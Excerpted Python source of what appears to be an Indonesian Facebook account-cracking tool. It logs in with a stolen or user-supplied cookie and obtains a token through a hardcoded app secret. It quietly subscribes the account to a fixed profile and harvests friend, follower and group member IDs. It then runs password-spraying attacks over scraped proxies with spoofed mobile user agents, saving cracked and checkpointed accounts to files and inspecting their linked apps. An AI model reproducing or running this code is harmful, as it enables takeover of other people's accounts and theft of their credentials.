...
class Login:
    ...
    def login_cokie(self):
        ...
        try:
            ...
            user = link["user_code"]
            vers = par(
                self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content,
                "html.parser",
            )
            ...
            meta = par(
                self.ses.post(
                    self.url + vers.find("form", method="post").get("action"),
                    data=data,
                    cookies={"cookie": cok},
                ).text,
                "html.parser",
            ...
            for x in xzxz("input", {"value": True}):
                try:
                    ...
                    pass
            xx = self.ses.post(
                f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie": cok}
            ).text
            if "Sukses!" in str(xx):
                tokz = self.ses.get(
                    f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e"
                ).json()
                self.maling_pangsit(cok, tokz["access_token"])
                open(".cok.txt", "w").write(cok)
                open(".tok.txt", "w").write(tokz["access_token"])
                exit(
                    f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python ASU.py"
                )
            else:
                prints(
                    Panel(
                        "😔[bold red] Cookie kamu invalid", style="bold white", width=70
                    )
                )
                time.sleep(3)
                self.menu()
            ...
            prints(
                Panel(
                    "😭[bold red] Tidak ada koneksi internet",
                    style="bold white",
                    width=70,
                )
            )
            ...
            prints(
                Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70)
            )
            time.sleep(3)
            self.login_cokie()
    ...
    def ubah_bahasa(self, cok):
        try:
            ...
            if "/zero/optin/write" in str(link):
                prints(
                    Panel(
                        "[bold white]🙄 akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.",
                        width=70,
                        style="bold white",
                    )
                )
                urll = (
                    re.search('href="/zero/optin/write/?(.*?)"', str(link))
                    .group(1)
                    .replace("amp;", "")
                )
            ...
            for x in data.find_all("form", {"method": "post"}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {
                        "fb_dtsg": re.search(
                            'name="fb_dtsg" value="(.*?)"', str(link)
                        ).group(1),
                        "jazoest": re.search(
                            'name="jazoest" value="(.*?)"', str(link)
                        ).group(1),
    ...
    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(
                f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}
            ).text
            date = {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(
                    1
                ),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(
                    1
                ),
            }
            self.ses.post(
                self.url
                + par(gett, "html.parser").find("form", {"method": "post"})["action"],
                data=date,
                cookies={"cookie": coki},
            ).text
            prints(
                Panel(
                    "😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python ASU.py[/]",
                    style="bold white",
                    width=70,
                )
            )
    ...
    def maling_pangsit(self, cok, tok):
        try:
            nama = self.ses.get(
                f"https://graph.facebook.com/me?fields=name&access_token={tok}",
                cookies={"cookie": cok},
            ).json()["name"]
        except:
            prints(
        ...
        try:
            link = par(
                self.ses.get(
                    f"{self.url}/profile.php?id=100005395413800",
                    cookies={"cookie": cok},
                ).text,
                "html.parser",
            )
            if "/a/subscriptions/remove" in str(link):
                prints(
                    Panel(
                        f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit",
                        style="bold white",
                        width=70,
                    )
                )
                ...
                self.ses.get(
                    f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok}
                )
                prints(
                    Panel(
                        f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit",
    ...
    def get_proxy(self):
        ...
        self.ses.headers.update(
            {
                "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"
            }
        )
        gots = par(
            self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text,
            "html.parser",
        )
    ...
    def menu(self):
        ...
        try:
            link = self.ses.get(
                f"https://graph.facebook.com/me?fields=name&access_token={tokz}",
                cookies=cook,
            ).json()
            nama = link["name"]
            idid = link["id"]
            ...
            self.hapus()
            print(
                f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain."
            )
            time.sleep(3)
            self.login_cokie()
...
"""
            % (N, H, N, N, H, N, N, H, N, N, H, N, N, H, N, N, H, N, N, H, N)
        )
        ...
        if ykh in ["", " "]:
            ...
            if rand in ["Y", "y"]:
                ...
                for mnh in range(nanya_keun):
                    ...
                    try:
                        tol = self.ses.get(
                            f"https://graph.facebook.com/{user}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}",
                            cookies=cook,
                        ).json()
                        ...
                        print(
                            f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik"
                        )
                        continue
                self.metode()
            else:
                ...
                try:
                    ...
                    for x in tol["friends"]["data"]:
                        ...
                        for x in titik:
                            sys.stdout.write(
                                f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} id{x}{N}"
                            )
                            sys.stdout.flush()
                except KeyError:
                    exit(
            ...
            try:
                tol = self.ses.get(
                    f"https://graph.facebook.com/{user}?fields=name,subscribers.fields(id,name).limit(1000000000)&access_token={tokz}",
                    cookies=cook,
                ).json()
            ...
            try:
                ...
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan")
                    time.sleep(2)
                    self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print(
                        "[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"
                    )
                    time.sleep(2)
                    self.menu()
...
-----------------------------------------------------"""
        ...
        if ykh in ["", " "]:
            ...
            try:
                yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:
                print("No ok results saved")
                time.sleep(2)
                self.cek_hasil()
            for i in yyy:
                print(i)
            ...
            try:
                yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:
                print("No cp results saved")
                time.sleep(2)
                self.cek_hasil()
            for i in yyy:
                print(i)
    ...
    def dumps(self, link, coki):
        try:
            ...
            cari = re.findall(
                '\<h3\ class\=".*?">\<span>\<strong>\<a\ href\="/(.*?)">(.*?)</a\>\</strong\>',
                data,
            )
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(
                        re.findall("id=(.*?)&amp;eav", x[0])[0] + "<=>" + x[1]
                    )
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0] + "<=>" + x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..")
                sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(
                    self.url
                    + par(data, "html.parser")
                    .find("a", string="Lihat Postingan Lainnya")
                    .get("href"),
                    coki,
                )
        except:
...
"""
        ...
        if ykh in ["", " "]:
            ...
            print(
                'kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n'
            )
...
-----------------------------------------------------"""
                    ...
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(
                                    self.kontol_kuda, user.split("<=>")[0], pwek, xx
                                )
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print(
...
-----------------------------------------------------"""
    ...
    def ua_api(self):
        ...
        return (
            f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"
            + "{density=3.0}]"
        )
    ...
    def cek_apk(self, user, pw, coki):
        try:
            ...
            if "/zero/optin/write" in str(link):
                ...
                gett = self.ses.get(
                    f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": coki}
                ).text
                poss = (
                    par(gett, "html.parser")
                    .find("form", {"method": "post"})["action"]
                    .replace("amp;", "")
                )
                date = {
                    "fb_dtsg": re.search(
                        'name="fb_dtsg" value="(.*?)"', str(gett)
                    ).group(1),
                    "jazoest": re.search(
                        'name="jazoest" value="(.*?)"', str(gett)
                    ).group(1),
                }
                self.ses.post(
                    f"{self.url}{poss}", data=date, cookies={"cookie": coki}
                ).text
        except:
            pass
        aktif = Tree("")
        ...
        tree.add("Aplikasi Terkait").add(
            f"Aktif [bold green]{str(len(self.ak))}[/]"
        ).add(aktif)
        ...
        try:
            ...
            for apk in link.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    self.ak.append(
                        f"[bold green]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}"
                    )
                else:
                    continue
            self.ApkAktif(
                self.url + link.find("a", string="Lihat Lainnya")["href"], cok
            )
        except:
            pass
        ...
        try:
            ...
            for apk in link.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    self.ka.append(
                        f"[bold red]{str(apk.text).replace('Kedaluwarsa','[bold white] - Kedaluwarsa')}"
                    )
                else:
                    continue
            self.ApkKadal(
    ...
    def apiiiiii(self, username, pasw):
        prog.update(
            des,
            description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]",
        )
        prog.advance(des)
        for password in pasw:
            try:
                ...
                if "session_key" in xnxx.text:
                    kntl = self.memek(
                        f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e"
                    )
                    cokz = ";".join(
                        i["name"] + "=" + i["value"] for i in anjg["session_cookies"]
                    )
                    ssbb = (
                    ...
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:
                        self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                    ...
                    mmks = self.memek(
                        f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e"
                    )
                    tree = Tree("")
                    ...
                    "Calls to this api have exceeded the rate limit. (613)" in xnxx.text
                ):
                    prog.update(
                        des,
                        description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]",
                    )
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
        ...
        for password in pasw:
            try:
                ...
                if "acy" in kntd:
                    ...
                    data = {
                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(
                            1
                        ),
                        ...
                        "jazoest": re.search(
                            'name="jazoest" value="(\d+)"', str(link)
                        ).group(1),
                        "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(
                            1
                        ),
                        "__a": re.search('"encrypted":"(.*?)"', str(link)).group(1),
                    }
                        ...
                        ses.headers.update(
                            {
                                ...
                                "referer": "https://id-id.facebook.com/login.php",
                ...
                head = {
                    "sec-fetch-site": "same-origin",
                    "origin": "https://" + re.findall("https://(.*?)/", urll)[0],
                    "accept": "*/*",
                    "cookie": f"{cuki}",
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(
                        1
                    ),
                    "referer": urll,
